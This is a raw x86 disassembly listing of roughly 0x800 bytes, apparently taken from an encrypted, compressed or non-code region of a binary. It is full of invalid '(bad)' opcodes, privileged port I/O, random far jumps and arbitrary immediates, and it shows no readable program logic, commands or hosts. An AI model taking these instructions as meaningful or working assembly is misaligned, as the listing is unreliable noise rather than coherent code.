  419ba2:	adc    DWORD PTR [edx+0x25e033c5],0xffffffcc
  419ba9:	clc    
  419baa:	ffreep st(6)
  419bac:	push   edi
  419bad:	cmp    ch,BYTE PTR [eax-0x14]
  419bb0:	in     eax,0x78
  419bb2:	data16 outs dx,BYTE PTR ds:[esi]
  419bb4:	stos   DWORD PTR es:[edi],eax
  419bb5:	push   edi
  419bb6:	pop    ebp
  419bb7:	sbb    BYTE PTR [edx+edi*8+0x3],al
  419bbb:	push   edi
  419bbc:	xor    al,0xea
  419bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bbf:	mov    ebx,0xe676e966
  419bc4:	jle    0x419c22
  419bc6:	mov    ebp,DWORD PTR [esi+0x29]
  419bc9:	and    ah,cl
  419bcb:	jmp    0x582b:0x64259be6
  419bd2:	add    eax,0x5e871de6
  419bd7:	xchg   ebp,eax
  419bd8:	fstp   DWORD PTR [ecx]
  419bda:	popf   
  419bdb:	popa   
  419bdc:	dec    ebp
  419bdd:	jmp    0x7581:0xefae4eb8
  419be4:	add    BYTE PTR [ebp+0x53c15d05],0x42
  419beb:	test   al,0x39
  419bed:	test   al,0xb0
  419bef:	(bad)  
  419bf0:	jmp    0x419c59
  419bf2:	adc    edi,eax
  419bf4:	xchg   esi,eax
  419bf5:	jno    0x419bb9
  419bf7:	xchg   ecx,eax
  419bf8:	mov    bl,0x63
  419bfa:	scas   eax,DWORD PTR es:[edi]
  419bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bfc:	inc    edi
  419bfd:	fist   WORD PTR [eax-0x24]
  419c00:	loop   0x419bfe
  419c02:	fmul   DWORD PTR [esi+0x62f02d84]
  419c08:	jmp    0x30c6:0x1106059c
  419c0f:	push   0xffffffcf
  419c11:	enter  0xe506,0x3a
  419c15:	clc    
  419c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c17:	jecxz  0x419bf5
  419c19:	imul   eax,ebp,0x1a20fdda
  419c1f:	xchg   edi,edx
  419c21:	ss es adc eax,0xf399311
  419c28:	mov    edx,0x4dad9588
  419c2d:	xchg   edx,eax
  419c2e:	aaa    
  419c2f:	das    
  419c30:	rcl    DWORD PTR [edx-0x21],cl
  419c33:	pop    edx
  419c34:	xchg   edi,eax
  419c35:	cmp    bh,BYTE PTR [edi]
  419c37:	lds    ebx,FWORD PTR ds:0xbfcdf12d
  419c3d:	xor    esi,DWORD PTR [esi-0x56]
  419c40:	mov    esi,0x6628f65
  419c45:	lea    eax,[esi-0x5a]
  419c48:	gs jl  0x419c08
  419c4b:	mov    WORD PTR ds:0xcc5ab1d,fs
  419c51:	mov    ah,0x87
  419c53:	rcl    DWORD PTR [edi+edi*8+0x37],1
  419c57:	out    0x1d,eax
  419c59:	sbb    eax,0xafb0d0e0
  419c5e:	push   0xffffff97
  419c60:	cmp    al,0x79
  419c62:	pop    es
  419c63:	outs   dx,DWORD PTR ds:[esi]
  419c64:	mov    edx,0xf39816bd
  419c69:	je     0x419c81
  419c6b:	fst    QWORD PTR [eax-0x35]
  419c6e:	mov    eax,ds:0xcaf22bf2
  419c73:	push   edi
  419c74:	scas   al,BYTE PTR es:[edi]
  419c75:	xchg   edx,eax
  419c76:	push   ss
  419c77:	xchg   edi,eax
  419c78:	sbb    cl,cl
  419c7a:	aaa    
  419c7b:	stc    
  419c7c:	cmp    DWORD PTR [ebx+ebp*4-0x24],eax
  419c80:	jg     0x419c0b
  419c82:	pop    ecx
  419c83:	test   al,0xdd
  419c85:	pop    eax
  419c86:	in     eax,0x59
  419c88:	popf   
  419c89:	scas   eax,DWORD PTR es:[edi]
  419c8a:	push   esi
  419c8b:	adc    edx,DWORD PTR [ebx+0x22b1ded1]
  419c91:	repnz or al,BYTE PTR [ebx+0x4ceec070]
  419c98:	jg     0x419c62
  419c9a:	je     0x419c50
  419c9c:	adc    cl,dl
  419c9e:	out    dx,eax
  419c9f:	pop    esi
  419ca0:	scas   eax,DWORD PTR es:[edi]
  419ca1:	inc    eax
  419ca2:	std    
  419ca3:	into   
  419ca4:	mov    WORD PTR [edi+0x4],ss
  419ca7:	gs jno 0x419cc2
  419caa:	push   ds
  419cab:	test   BYTE PTR [eax-0x6ab9cc6d],0x26
  419cb2:	hlt    
  419cb3:	inc    ecx
  419cb4:	stos   BYTE PTR es:[edi],al
  419cb5:	push   edi
  419cb6:	dec    ebx
  419cb7:	sar    BYTE PTR [edx-0x2aa88d33],1
  419cbd:	jl     0x419d27
  419cbf:	dec    ecx
  419cc0:	adc    dl,ah
  419cc2:	rcl    DWORD PTR [ebx],0x6f
  419cc5:	ret    0xe68a
  419cc8:	out    0x52,al
  419cca:	mov    BYTE PTR [ebp+0x5d],al
  419ccd:	out    dx,al
  419cce:	mov    al,ds:0x48895010
  419cd3:	dec    ecx
  419cd4:	fcomp  DWORD PTR [edi+0x48]
  419cd7:	sbb    BYTE PTR [ebp-0x5df72f02],ah
  419cdd:	jmp    0x7d6c:0xfb71f802
  419ce4:	leave  
  419ce5:	hlt    
  419ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ce7:	ins    DWORD PTR es:[edi],dx
  419ce8:	les    esp,FWORD PTR [eax+ebp*8-0x2fac4b56]
  419cef:	sahf   
  419cf0:	call   0x500a:0x67a4593d
  419cf7:	dec    ebx
  419cf8:	pop    ebp
  419cf9:	push   esp
  419cfa:	fwait
  419cfb:	shl    BYTE PTR [edi],1
  419cfd:	rcr    DWORD PTR [ecx-0x33b218c4],1
  419d03:	repz cld 
  419d05:	push   esi
  419d06:	call   0xbb72:0x1393611b
  419d0d:	paddsw mm6,mm2
  419d10:	xchg   edi,eax
  419d11:	jns    0x419cf3
  419d13:	or     ah,0xe4
  419d16:	jnp    0x419d32
  419d18:	dec    edi
  419d19:	imul   ebx,DWORD PTR [eax-0x75],0xffffff97
  419d1d:	xchg   esi,eax
  419d1e:	cwde   
  419d1f:	sub    ah,BYTE PTR [ecx+0x6615bdd8]
  419d25:	les    ecx,FWORD PTR [ebx+ebx*1]
  419d28:	scas   eax,DWORD PTR es:[edi]
  419d29:	and    ebx,edi
  419d2b:	imul   ebx,DWORD PTR [esi],0x59
  419d2e:	call   FWORD PTR [ebx+0x58]
  419d31:	pop    edx
  419d32:	sbb    ch,BYTE PTR [edx-0x34fc9e4c]
  419d38:	cmp    edi,esi
  419d3a:	pushf  
  419d3b:	aas    
  419d3c:	xchg   edi,eax
  419d3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d3e:	mov    dh,0x21
  419d40:	mov    ch,0xac
  419d42:	mov    al,0x45
  419d44:	mov    bl,0x9
  419d46:	mov    edx,esp
  419d48:	xchg   ecx,eax
  419d49:	vpshld xmm9,xmm1,es:[edx-0x29]
  419d50:	inc    ebp
  419d51:	mov    cl,0x6b
  419d53:	push   0xf253dfb8
  419d58:	and    al,ch
  419d5a:	in     al,dx
  419d5b:	aad    0x25
  419d5d:	and    BYTE PTR [edi+0x6],dl
  419d60:	push   esi
  419d61:	jb     0x419d9d
  419d63:	(bad)  
  419d64:	dec    edi
  419d65:	push   esp
  419d66:	xlat   BYTE PTR ds:[ebx]
  419d67:	aam    0x26
  419d69:	in     eax,0x23
  419d6b:	call   0x3e68:0x53cbf0b1
  419d72:	push   ebp
  419d73:	pusha  
  419d74:	aam    0x10
  419d76:	adc    eax,0x157a4858
  419d7b:	cli    
  419d7c:	mov    cl,0x74
  419d7e:	test   BYTE PTR [edi],ah
  419d80:	fidivr DWORD PTR [esi]
  419d82:	aam    0x7f
  419d84:	ja     0x419d0c
  419d86:	pop    esp
  419d87:	cmp    BYTE PTR [ebp+0x8918534],bl
  419d8d:	xor    cl,BYTE PTR [ecx]
  419d8f:	jnp    0x419d5c
  419d91:	xlat   BYTE PTR ds:[ebx]
  419d92:	(bad)
  419d96:	push   ss
  419d97:	mov    edi,0xa4431a85
  419d9c:	jnp    0x419dd5
  419d9e:	and    ah,al
  419da0:	imul   esp,DWORD PTR [esi+0x4ba1593],0xffffffad
  419da7:	add    al,0x87
  419da9:	clc    
  419daa:	xchg   edi,eax
  419dab:	adc    ah,bh
  419dad:	out    0x81,eax
  419daf:	retf   0xfb52
  419db2:	loop   0x419d96
  419db4:	dec    eax
  419db5:	dec    edi
  419db6:	popf   
  419db7:	mov    WORD PTR [edi+ecx*1+0x3ef653fc],?
  419dbe:	fs (bad) 
  419dc0:	scas   al,BYTE PTR es:[edi]
  419dc1:	lea    ecx,[edx+esi*1+0x7e]
  419dc5:	aad    0x6c
  419dc7:	in     eax,0x57
  419dc9:	ds inc ecx
  419dcb:	shr    DWORD PTR [ebx-0x4b],0x93
  419dcf:	leave  
  419dd0:	ds inc ebx
  419dd2:	dec    esi
  419dd3:	dec    esi
  419dd4:	adc    esi,ebx
  419dd6:	xchg   edx,eax
  419dd7:	add    ebp,DWORD PTR [esi-0x15]
  419dda:	jo     0x419dcc
  419ddc:	test   eax,0x23372e88
  419de1:	test   al,0x81
  419de3:	pop    esi
  419de4:	and    edi,0x8288ed6
  419dea:	aas    
  419deb:	pop    esi
  419dec:	fmul   QWORD PTR [ecx+eiz*8-0x14]
  419df0:	test   BYTE PTR [ebx],0xe3
  419df3:	std    
  419df4:	std    
  419df5:	repnz add BYTE PTR [esi+0x7d],0x4
  419dfa:	push   ebp
  419dfb:	xor    al,0x17
  419dfd:	cmp    al,0x69
  419dff:	adc    eax,0xd33b76ab
  419e04:	mov    ds:0x837c9ee7,eax
  419e09:	fist   DWORD PTR [ebp+0x6b93934b]
  419e10:	mov    esi,0xc61ff93e
  419e15:	outs   dx,DWORD PTR ds:[esi]
  419e16:	pop    ebx
  419e17:	fadd   QWORD PTR ds:0xfb77bfd4
  419e1d:	in     eax,0xc1
  419e1f:	nop
  419e20:	out    0xfe,eax
  419e22:	or     ebx,DWORD PTR [esi-0x20]
  419e25:	fadd   DWORD PTR [ecx+0x2625a45b]
  419e2b:	xor    eax,edi
  419e2d:	cmp    eax,0x504934fb
  419e32:	adc    bl,BYTE PTR [edx]
  419e34:	pop    eax
  419e35:	pop    ss
  419e36:	mov    ebx,0xc059adcf
  419e3b:	lods   al,BYTE PTR ds:[esi]
  419e3c:	add    dh,dl
  419e3e:	in     al,dx
  419e3f:	pop    eax
  419e40:	ret    0xfc85
  419e43:	in     al,0xbe
  419e45:	in     eax,dx
  419e46:	jmp    0x419e2a
  419e48:	ret    0x6e41
  419e4b:	scas   al,BYTE PTR es:[edi]
  419e4c:	std    
  419e4d:	and    eax,0xba3ef746
  419e52:	or     eax,0x89c62e6e
  419e57:	push   ss
  419e58:	fild   QWORD PTR [edx]
  419e5a:	push   ds
  419e5b:	cmp    bl,BYTE PTR [ecx+0x21]
  419e5e:	or     cl,BYTE PTR [esi-0x4d]
  419e61:	add    edx,DWORD PTR [esi-0x608846f2]
  419e67:	repnz pop edx
  419e69:	iret   
  419e6a:	push   esp
  419e6b:	(bad)  
  419e6c:	mov    BYTE PTR [ebx-0x2c9710e4],cl
  419e72:	in     al,dx
  419e73:	inc    edx
  419e74:	mov    ebx,0xe6fb3dda
  419e79:	(bad)  
  419e7a:	mov    ebp,0xe4d12d92
  419e7f:	repnz repz xlat BYTE PTR ds:[ebx]
  419e82:	mov    eax,DWORD PTR [ebx]
  419e84:	ds adc ah,0xc5
  419e88:	inc    edx
  419e89:	arpl   bp,dx
  419e8b:	icebp  
  419e8c:	adc    eax,0xe53c49ac
  419e92:	rcl    BYTE PTR [edi-0x758b3b42],cl
  419e98:	xor    DWORD PTR [edx-0x4747786e],edi
  419e9e:	pop    edx
  419e9f:	push   ebx
  419ea0:	jns    0x419ed4
  419ea2:	mov    esp,0x646246ce
  419ea7:	scas   al,BYTE PTR es:[edi]
  419ea8:	inc    edi
  419ea9:	inc    esp
  419eaa:	nop
  419eab:	or     eax,0xe5662d14
  419eb0:	mov    esi,0x1406ac40
  419eb5:	xor    al,0x4b
  419eb7:	sub    eax,0x4d51fd49
  419ebc:	push   ebx
  419ebd:	aam    0xa6
  419ebf:	dec    eax
  419ec0:	retf   0x81b1
  419ec3:	sbb    DWORD PTR cs:[esi+ecx*1+0x54dc57e5],edx
  419ecb:	mov    ah,0xb6
  419ecd:	and    BYTE PTR [esi-0x40],dl
  419ed0:	inc    eax
  419ed1:	pop    esp
  419ed2:	(bad)  
  419ed3:	mov    bl,0x2e
  419ed5:	sbb    DWORD PTR [ecx],edi
  419ed7:	push   esp
  419ed8:	loop   0x419f53
  419eda:	iret   
  419edb:	xchg   ecx,eax
  419edc:	mov    al,ds:0x8a43f56a
  419ee1:	mov    ebx,0x25790b7a
  419ee6:	add    eax,0x415a5634
  419eeb:	gs mov esi,ebp
  419eee:	xchg   edi,eax
  419eef:	sub    eax,DWORD PTR [esi-0x37f63848]
  419ef5:	call   0xfbc79a07
  419efa:	nop
  419efb:	out    dx,eax
  419efc:	push   ebp
  419efd:	cmp    DWORD PTR [esi+0x65],esi
  419f00:	add    bl,BYTE PTR [ebx-0x1021c087]
  419f06:	loop   0x419ee4
  419f08:	test   al,0x5b
  419f0a:	mov    bh,0xe6
  419f0c:	leave  
  419f0d:	pop    esp
  419f0e:	inc    esp
  419f0f:	ja     0x419ee4
  419f11:	scas   eax,DWORD PTR es:[edi]
  419f12:	or     eax,0x5bae9495
  419f17:	mov    DWORD PTR [esi-0x6ac0c3e1],esi
  419f1d:	arpl   WORD PTR [edi+0x18b334b5],cx
  419f23:	xchg   ebx,eax
  419f24:	retf   
  419f25:	cmp    eax,0xfb553ab1
  419f2a:	repnz adc DWORD PTR [ebp+0x2d2d9177],ecx
  419f31:	xor    dl,al
  419f33:	push   0xffffff96
  419f35:	mov    al,0xb5
  419f37:	scas   al,BYTE PTR es:[edi]
  419f38:	lods   eax,DWORD PTR ds:[esi]
  419f39:	or     esi,ecx
  419f3b:	lahf   
  419f3c:	push   edx
  419f3d:	iret   
  419f3e:	iret   
  419f3f:	jmp    0x419edd
  419f41:	cwde   
  419f42:	jmp    0x3f8946c0
  419f47:	mov    ecx,ecx
  419f49:	repz call 0x7711:0x79721581
  419f51:	dec    BYTE PTR [ebx+0x2c6acf0f]
  419f57:	adc    cl,dl
  419f59:	xchg   edi,eax
  419f5a:	out    0x1c,eax
  419f5c:	mov    DWORD PTR [edx-0x3b916972],ecx
  419f62:	test   BYTE PTR [edx+ebx*8],0xf0
  419f66:	in     eax,0xef
  419f68:	pushf  
  419f69:	mov    edi,0x5a89be3
  419f6e:	stos   BYTE PTR es:[edi],al
  419f6f:	nop
  419f70:	outs   dx,BYTE PTR ds:[esi]
  419f71:	push   cs
  419f72:	and    al,0x42
  419f74:	sub    BYTE PTR [edi+0x2ff5350f],bh
  419f7a:	js     0x419fbe
  419f7c:	mov    ecx,0xe6a16a2e
  419f81:	pop    ss
  419f82:	sub    ecx,DWORD PTR ds:0x63909949
  419f88:	hlt    
  419f89:	lods   eax,DWORD PTR ds:[esi]
  419f8a:	inc    eax
  419f8b:	std    
  419f8c:	ror    BYTE PTR [eax+0x3f40eb9e],1
  419f92:	cmc    
  419f93:	pop    ebx
  419f94:	add    eax,0x2865d01e
  419f99:	arpl   di,bp
  419f9b:	pop    esp
  419f9d:	jns    0x419f7b
  419f9f:	cld    
  419fa0:	fdiv   st(0),st
  419fa2:	hlt    
  419fa3:	test   ch,bl
  419fa5:	adc    dh,BYTE PTR [edx]
  419fa7:	fucomi st,st(3)
  419fa9:	rol    bh,0x7b
  419fac:	repnz inc ebx
  419fae:	sub    BYTE PTR [esi-0x260e68f],cl
  419fb4:	mov    BYTE PTR [ebx-0x707dc8e9],bl
  419fba:	je     0x41a034
  419fbc:	repnz xor DWORD PTR [ebx],esi
  419fbf:	add    DWORD PTR [ebp+esi*8-0x1e],ebp
  419fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fc4:	movq   QWORD PTR [edx],mm0
  419fc7:	adc    eax,0x5ef9f61a
  419fcc:	and    BYTE PTR [ebp-0x47754ea4],dl
  419fd2:	fistp  WORD PTR [eax]
  419fd4:	cmp    eax,0x6041a825
  419fd9:	cmp    al,0xcd
  419fdb:	arpl   WORD PTR [esi+eax*1+0x63],dx
  419fdf:	dec    edx
  419fe0:	xchg   DWORD PTR [ebp-0x7d48f834],edx
  419fe6:	mov    dl,0x5b
  419fe8:	sub    al,BYTE PTR [edi+esi*1+0x648f77f3]
  419fef:	cmc    
  419ff0:	mov    ecx,0x402923ab
  419ff5:	mov    ebp,0x5b63218f
  419ffa:	aas    
  419ffb:	shr    DWORD PTR [ebx+0x35e239bb],1
  41a001:	lods   al,BYTE PTR ds:[esi]
  41a002:	out    0x2f,al
  41a004:	and    al,0x1b
  41a006:	or     eax,0xe5236f64
  41a00b:	jno    0x41a06e
  41a00d:	dec    ebx
  41a00e:	inc    edi
  41a00f:	dec    ebx
  41a010:	daa    
  41a011:	adc    ch,BYTE PTR [esi-0x3f]
  41a014:	push   0x2ebc0f67
  41a019:	or     DWORD PTR [edi+0xd5a1939],0xa1c668e0
  41a023:	push   es
  41a024:	aam    0x9c
  41a026:	xchg   ebp,eax
  41a027:	pop    esp
  41a028:	push   es
  41a029:	inc    eax
  41a02a:	mov    ds:0x5413ad0e,eax
  41a02f:	pop    ecx
  41a030:	mov    edi,0xf0114d32
  41a035:	cs and al,0x31
  41a038:	inc    edx
  41a039:	cmp    dl,BYTE PTR [ecx+ebp*2]
  41a03c:	sbb    BYTE PTR [esi+ebp*8],dl
  41a03f:	and    cl,ch
  41a041:	aam    0xe9
  41a043:	es pop ebx
  41a045:	lds    esp,FWORD PTR [ecx]
  41a047:	mov    dh,0x68
  41a049:	xor    al,0x38
  41a04b:	test   eax,0x3f551db2
  41a050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a051:	inc    esi
  41a052:	xchg   edx,eax
  41a053:	imul   BYTE PTR ds:0x6abfe24b
  41a059:	sub    BYTE PTR [edx-0x12],cl
  41a05c:	mov    bl,bl
  41a05e:	sbb    DWORD PTR [esi],esi
  41a060:	xchg   edx,eax
  41a061:	pop    ebp
  41a062:	call   0x44f3:0x80952634
  41a069:	shr    DWORD PTR [edi],0x4a
  41a06c:	dec    esp
  41a06d:	gs ins BYTE PTR es:[edi],dx
  41a06f:	inc    edx
  41a070:	daa    
  41a071:	add    esp,DWORD PTR [ebp-0x1c]
  41a074:	fld    DWORD PTR [esp+edx*1-0x31]
  41a078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a079:	push   esi
  41a07a:	xor    DWORD PTR [edx-0xd06e02e],eax
  41a080:	icebp  
  41a081:	das    
  41a082:	and    cl,BYTE PTR [ebx+ebp*8]
  41a085:	int3   
  41a086:	out    0xb7,al
  41a088:	and    edx,edi
  41a08a:	xchg   ebx,eax
  41a08b:	and    edx,DWORD PTR [eax]
  41a08d:	push   ebx
  41a08e:	pop    edx
  41a08f:	ins    BYTE PTR es:[edi],dx
  41a090:	shr    DWORD PTR [esi+0x69],1
  41a093:	mov    ah,0xa6
  41a095:	or     ah,BYTE PTR [edx-0x2]
  41a098:	or     eax,0x55
  41a09b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a09c:	mov    ds:0xfb62ba86,al
  41a0a1:	or     dh,BYTE PTR [edx+eax*2]
  41a0a4:	mov    dh,0x1b
  41a0a6:	es mov edi,0xd16d1fe6
  41a0ac:	inc    esp
  41a0ad:	mov    ds:0x150ed561,al
  41a0b2:	add    eax,0xcdd64fba
  41a0b7:	in     eax,dx
  41a0b8:	imul   eax,DWORD PTR [esi],0x1b
  41a0bb:	repz inc edi
  41a0bd:	mov    ebx,0x794b7a9b
  41a0c2:	mov    edx,0x63d81af8
  41a0c7:	jmp    0x2c1bf3e1
  41a0cc:	cmp    dh,ch
  41a0ce:	fdiv   DWORD PTR fs:[ebx]
  41a0d1:	cmp    esp,esp
  41a0d3:	and    DWORD PTR [eax],ebp
  41a0d5:	xor    DWORD PTR [eax-0xf4b2d65],esi
  41a0db:	je     0x41a13f
  41a0dd:	or     DWORD PTR [ebx+esi*2-0x12ffb19d],0xffffffbf
  41a0e5:	pop    eax
  41a0e6:	es and eax,0x391f00c8
  41a0ec:	xchg   edx,eax
  41a0ed:	scas   al,BYTE PTR es:[edi]
  41a0ee:	xchg   edi,eax
  41a0ef:	pusha  
  41a0f0:	sub    ebx,DWORD PTR [esi]
  41a0f2:	push   0xf47d8743
  41a0f7:	xchg   ebp,eax
  41a0f8:	mov    ebx,0x2e934412
  41a0fd:	sbb    edx,DWORD PTR [ecx]
  41a0ff:	mov    al,0x71
  41a101:	pop    edi
  41a102:	or     al,0x28
  41a104:	fisttp DWORD PTR [eax]
  41a106:	fiadd  DWORD PTR [edx-0x12]
  41a109:	test   DWORD PTR [ebp+0x624ac941],0x4860c6f9
  41a113:	call   0x37a0acc3
  41a118:	or     BYTE PTR [ecx+esi*1],al
  41a11b:	dec    esi
  41a11c:	inc    eax
  41a11d:	shr    DWORD PTR [esi+0x3c],1
  41a120:	into   
  41a121:	jle    0x41a15b
  41a123:	out    dx,al
  41a124:	dec    edi
  41a125:	outs   dx,BYTE PTR ds:[esi]
  41a126:	jne    0x41a130
  41a128:	xchg   esp,eax
  41a129:	cli    
  41a12a:	shl    bl,1
  41a12c:	out    0x76,al
  41a12e:	ret    
  41a12f:	jo     0x41a167
  41a131:	dec    ebp
  41a133:	jmp    0x41a177
  41a135:	xor    al,0x1d
  41a137:	mov    al,0x14
  41a139:	aad    0x57
  41a13b:	out    dx,eax
  41a13c:	dec    esi
  41a13d:	iret   
  41a13e:	sar    ebx,0x8
  41a141:	bnd jg 0x41a167
  41a144:	jge    0x41a10e
  41a146:	mov    ds:0x9f80a1a8,al
  41a14b:	fild   WORD PTR [esi]
  41a14d:	mov    al,ds:0x7c761714
  41a152:	in     eax,dx
  41a153:	out    0xf1,al
  41a155:	loope  0x41a126
  41a157:	pop    esi
  41a158:	bound  edx,QWORD PTR [ebx+0x41]
  41a15b:	rcr    ch,0xff
  41a15e:	add    BYTE PTR [edx],ah
  41a160:	add    DWORD PTR [edx+ecx*8+0x21],edx
  41a164:	ficom  DWORD PTR [esi]
  41a166:	cs inc eax
  41a168:	fidivr WORD PTR [esi]
  41a16a:	outs   dx,DWORD PTR ds:[esi]
  41a16b:	retf   
  41a16c:	aad    0x17
  41a16e:	mov    dh,0x8
  41a170:	cmp    al,0x1c
  41a172:	scas   eax,DWORD PTR es:[edi]
  41a173:	mov    cl,0x4a
  41a175:	and    cl,BYTE PTR [edi+0x56]
  41a178:	call   0xb5c:0xce778be9
  41a17f:	xchg   esi,eax
  41a180:	inc    esi
  41a181:	xor    bl,BYTE PTR [ebx+0x3708f7ef]
  41a187:	xor    eax,0x3a442834
  41a18c:	pushf  
  41a18d:	adc    eax,esi
  41a18f:	sub    ah,cl
  41a191:	imul   edx,DWORD PTR [esi+0x5],0x37
  41a195:	int    0x29
  41a197:	nop
  41a198:	jle    0x41a149
  41a19a:	test   DWORD PTR [edx+ebx*4-0x402ee10f],ebp
  41a1a1:	stc    
  41a1a2:	scas   al,BYTE PTR es:[edi]
  41a1a3:	(bad)  
  41a1a5:	xor    edi,DWORD PTR [ecx+0x7a]
  41a1a8:	mov    ch,0xc7
  41a1aa:	or     al,0xfd
  41a1ac:	in     eax,0x56
  41a1ae:	(bad)  
  41a1af:	sub    eax,0x37faf7a8
  41a1b4:	loope  0x41a226
  41a1b6:	aad    0xb7
  41a1b8:	mul    ch
  41a1ba:	invd   
  41a1bc:	xchg   DWORD PTR [eax],ebp
  41a1be:	mov    ds,WORD PTR [ebp+0x751b56ab]
  41a1c4:	jp     0x41a1fb
  41a1c6:	cdq    
  41a1c7:	retf   0x5d43
  41a1ca:	inc    eax
  41a1cb:	jmp    0x41a238
  41a1cd:	pop    edx
  41a1ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1cf:	dec    ebx
  41a1d0:	dec    esi
  41a1d1:	mov    BYTE PTR [ebx],cl
  41a1d3:	imul   DWORD PTR [esi+0x539cae03]
  41a1d9:	and    esi,DWORD PTR ds:0x142c7770
  41a1df:	inc    esi
  41a1e0:	xchg   ecx,eax
  41a1e1:	lock inc ebp
  41a1e3:	cdq    
  41a1e4:	aad    0xbb
  41a1e6:	mov    esi,0x5dbf0e7d
  41a1eb:	or     DWORD PTR [ebp+0x6b],ecx
  41a1ee:	adc    ah,ah
  41a1f0:	push   edx
  41a1f1:	pop    esi
  41a1f2:	or     dh,BYTE PTR [ecx+0x42]
  41a1f5:	mov    ch,BYTE PTR [edx+0xc]
  41a1f8:	faddp  st(3),st
  41a1fa:	retf   0x530
  41a1fd:	fnstenv [ebp+eax*8+0x3b2b1c0c]
  41a204:	push   0x33
  41a206:	cwde   
  41a207:	aam    0x87
  41a209:	repz leave 
  41a20b:	stc    
  41a20c:	aad    0xc1
  41a20e:	dec    esi
  41a20f:	leave  
  41a210:	cmp    al,0x8
  41a212:	int    0xd5
  41a214:	mov    bl,0xbf
  41a216:	fcom   DWORD PTR [eax+0x5]
  41a219:	push   esi
  41a21a:	(bad)  
  41a21b:	rcl    DWORD PTR [esi+0x46],1
  41a21e:	pop    esi
  41a21f:	jmp    0x41a28a
  41a221:	sub    eax,0x57141716
  41a226:	sbb    ebp,DWORD PTR [edx]
  41a228:	repz dec eax
  41a22a:	sbb    ebp,DWORD PTR [esi-0x5cda0a45]
  41a230:	sahf   
  41a231:	dec    esp
  41a232:	mov    ah,0xa9
  41a234:	mov    ds:0x7a2baed8,eax
  41a239:	fwait
  41a23a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a23b:	(bad)  
  41a23d:	out    0xbf,eax
  41a23f:	sbb    ah,BYTE PTR [esi-0x59]
  41a242:	xchg   ebx,eax
  41a243:	mov    dl,0xb8
  41a245:	jl     0x41a287
  41a247:	inc    ecx
  41a248:	add    eax,0x1ba721c4
  41a24d:	cmp    BYTE PTR [ebp+0x398be989],al
  41a253:	push   edi
  41a254:	mov    cl,0xf8
  41a256:	adc    DWORD PTR [eax],esp
  41a258:	(bad)  
  41a259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a25a:	mov    ebp,0xd1c2bb8c
  41a25f:	retf   0xd7d0
  41a262:	xor    al,0xbe
  41a264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a265:	enter  0x710b,0x3b
  41a269:	jae    0x41a1fd
  41a26b:	cmp    eax,0x3fa50312
  41a270:	fnstenv [eax-0x1cec7194]
  41a276:	les    edx,FWORD PTR [edx+0x50]
  41a279:	jae    0x41a2c7
  41a27b:	push   ss
  41a27c:	xor    DWORD PTR [ebp+0x190ef41c],ebp
  41a282:	inc    edx
  41a283:	push   eax
  41a284:	and    eax,0x526a5e0e
  41a289:	mov    edx,0x86c28776
  41a28e:	imul   esi,DWORD PTR [esi+eiz*8-0x23f916e1],0x45c80660
  41a299:	int    0xd4
  41a29b:	nop
  41a29c:	addr16 sti 
  41a29e:	imul   esp,DWORD PTR [eax+0x4d00c838],0x83347e67
  41a2a8:	push   ebx
  41a2a9:	xor    dh,BYTE PTR [ebx+0xb37b65c]
  41a2af:	hlt    
  41a2b0:	call   0xaa7b:0x7a654da4
  41a2b7:	loop   0x41a2d7
  41a2b9:	inc    esi
  41a2ba:	inc    ebx
  41a2bb:	inc    edi
  41a2bc:	nop    DWORD PTR [esi+0x3a]
  41a2c0:	int3   
  41a2c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c2:	mov    ebx,0xa6144801
  41a2c7:	(bad)  
  41a2c9:	in     al,dx
  41a2ca:	sti    
  41a2cb:	ja     0x41a2c4
  41a2cd:	mov    bh,0xc1
  41a2cf:	stos   BYTE PTR es:[edi],al
  41a2d0:	ficomp WORD PTR [ecx-0x2d5b059d]
  41a2d6:	fbstp  TBYTE PTR [esi-0x19]
  41a2d9:	scas   eax,DWORD PTR es:[edi]
  41a2da:	add    ecx,DWORD PTR [eax-0x30]
  41a2dd:	js     0x41a282
  41a2df:	add    ebx,esp
  41a2e1:	and    ecx,DWORD PTR [esi+0x32]
  41a2e4:	and    DWORD PTR ds:0x5b4cbe95,edi
  41a2ea:	jmp    0x5a59c922
  41a2ef:	dec    esp
  41a2f0:	into   
  41a2f1:	ret    0xc6a7
  41a2f4:	cmp    BYTE PTR ds:0x2dd48b23,ah
  41a2fa:	daa    
  41a2fb:	pop    ax
  41a2fd:	aam    0x44
  41a2ff:	add    al,0x9b
  41a301:	pop    edi
  41a302:	ja     0x41a37d
  41a304:	mov    cl,0x37
  41a306:	xchg   esi,eax
  41a307:	pop    edi
  41a308:	pop    es
  41a309:	mov    edx,0x569b207
  41a30e:	xchg   cl,bl
  41a310:	idiv   DWORD PTR [edx]
  41a312:	lea    esp,[edi-0x3ae1902c]
  41a318:	clc    
  41a319:	aas    
  41a31a:	lods   al,BYTE PTR ds:[esi]
  41a31b:	xor    al,0xbf
  41a31d:	stc    
  41a31e:	inc    ebx
  41a31f:	loopne 0x41a333
  41a321:	cli    
  41a322:	(bad)  
  41a323:	or     eax,0x94f7d0c5
  41a328:	enter  0xd14e,0xd6
  41a32c:	test   DWORD PTR [ebx],esp
  41a32e:	pop    edi
  41a32f:	adc    DWORD PTR ds:0x2cb2be48,ecx
  41a335:	sub    DWORD PTR [ecx-0x7106f636],esp
  41a33b:	xor    eax,0x5978614c
  41a340:	frstor [ebx+0x78]
  41a343:	and    eax,0x2e4c19c4
  41a348:	call   0xcb8d3f81
  41a34d:	(bad)  
  41a34e:	fwait
  41a34f:	test   BYTE PTR [ebp+0x23],bh
  41a352:	sti    
  41a353:	addr16 mov ah,0x26
  41a356:	and    ebx,esi
